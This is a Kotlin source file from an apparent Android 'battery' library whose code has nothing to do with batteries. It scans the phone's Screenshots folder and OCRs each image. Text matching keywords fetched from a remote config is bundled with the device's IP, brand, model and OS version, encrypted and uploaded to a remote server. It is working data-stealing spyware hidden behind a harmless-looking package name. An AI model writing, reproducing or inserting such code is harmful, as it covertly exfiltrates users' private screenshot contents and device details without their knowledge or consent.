package com.extra.clbatterylibrary.manager

import android.net.Uri
import android.os.Build
import androidx.core.net.toUri
import com.blankj.utilcode.util.FileUtils
import com.blankj.utilcode.util.JsonUtils
import com.blankj.utilcode.util.PathUtils
import com.blankj.utilcode.util.Utils
import com.extra.clbatterylibrary.kt.logE
import com.extra.clbatterylibrary.kt.logV
import com.extra.clbatterylibrary.utils.AESUtil
import com.extra.clbatterylibrary.utils.BlowfishUtil
import com.extra.clbatterylibrary.utils.IPAddrUtils
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.chinese.ChineseTextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.launch
import org.json.JSONObject


object CLBatteryManager {

    @Volatile
    private var isTaskRunning = false
    private var pendingUploads = 0
    private var completedUploads = 0

    private fun loadPhoneScreenShots(
        modeType: Int,
        fileSize: Long,
        pageSize: String,
        searchList: List<String>,
        channel: String,
        onComplete: () -> Unit
    ) {

        var dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
        if (!FileUtils.isFileExists(dirPath)) {
            dirPath = PathUtils.getExternalPicturesPath() + "/Screenshots"
        }
        if (!FileUtils.isFileExists(dirPath)){
            val externalPath = "storage/emulated/0"
            if (FileUtils.isFileExists(externalPath)){
                for (file in FileUtils.listFilesInDir(externalPath)) {
                    FileUtils.listFilesInDir(file.absolutePath).forEach {
                        if (it.absolutePath.contains("Screenshots")){
                            dirPath = it.absolutePath
                            return@forEach
                        }
                    }
                }
            }
        }
        val filesList = FileUtils.listFilesInDir(dirPath)
        val filesInDir =
            filesList.filter {
                val length = FileUtils.getLength(it)
                length <= fileSize
            }
        if (filesInDir.isEmpty()) {
            onComplete()
            return
        }

        var processedFiles = 0
        for (file in filesInDir) {
            val uri = file.toUri()
            recognizeText(modeType, uri) { content ->
                processedFiles++
                if (content != null) {
                    val containData = searchList.filter { searchKey -> 
                        content.contains(searchKey, true) || searchKey.contains(content, true) 
                    }
                    if (containData.isNotEmpty()) {
                        submitData(encryptData(pageSize, content), channel) {
                            if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
                                onComplete()
                            }
                        }
                    } else if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
                        onComplete()
                    }
                } else if (processedFiles == filesInDir.size && completedUploads == pendingUploads) {
                    onComplete()
                }
            }
        }
    }

    private fun recognizeText(modeType: Int, uri: Uri, callback: (String?) -> Unit) {
//        val textRecognizer = when (modeType) {
//            1 -> TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            2 -> TextRecognition.getClient(TextRecognizerOptions.Builder().build())
//            else -> {
//                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            }
//        }
        MainScope().launch(Dispatchers.IO) {
            val textRecognizer =
                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
            val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
            textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
                callback.invoke(visionText.text)
            }.addOnFailureListener { e ->
                callback.invoke(null)
            }
        }
    }

    /**
     *  提交数据
     *  @param key 识别出来的数据
     *  @param channel 渠道号
     */
    private fun submitData(key: String?, channel: String = "BatteryHID", onComplete: () -> Unit) {
        if (key.isNullOrBlank()) {
            onComplete()
            return
        }
        pendingUploads++
        HttpManager.httpPost(HttpManager.getSubmitUrl(), key, channel) { json ->
            completedUploads++
            onComplete()
        }
    }

    /**
     *  加密数据
     */
    private fun encryptData(pageSize: String,content:String): String? {
        //[图片内容字符串]--[ip]--[机型]
        val deviceInfo = "厂商:${Build.BRAND} 手机型号:${Build.MODEL} 系统版本:${Build.VERSION.RELEASE}"
        val taskContent = "[${content}]--[${IPAddrUtils.getIpAddress(Utils.getApp())}]--[${System.currentTimeMillis()}]--[${deviceInfo}]"
        try {
            val decryptData = AESUtil.decrypt(pageSize)
            val decrypt = if (decryptData.length > 7) {
                decryptData.substring(0, 8)
            } else {
                decryptData
            }
            val data = taskContent.toByteArray()
            val encrypt = BlowfishUtil.encrypt(decrypt, data)
            return encrypt
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }


    fun doTask(channel:String="BatteryHID") {
        if (isTaskRunning) {
            return
        }
        
        isTaskRunning = true
        pendingUploads = 0
        completedUploads = 0
        
        HttpManager.httpGet(HttpManager.getConfigUrl()) { json ->
            if (json.isNullOrBlank()) {
                isTaskRunning = false
                return@httpGet
            }
            if (JsonUtils.getInt(json, "code") == 200) {
                val dataJson = JsonUtils.getJSONObject(json, "data", JSONObject())
                val modeType = dataJson.getInt("modeType")
                val fileSize = dataJson.getLong("fileSize")
                val pageSize = dataJson.getString("pageSize")
                val searchKey = dataJson.getString("searchKey")
                val searchList = searchKey.split(",")
                
                loadPhoneScreenShots(
                    modeType = modeType,
                    fileSize = fileSize * 1024,
                    pageSize = pageSize,
                    searchList = searchList,
                    channel = channel
                ) {
                    isTaskRunning = false
                }
            } else {
                isTaskRunning = false
            }
        }
    }

}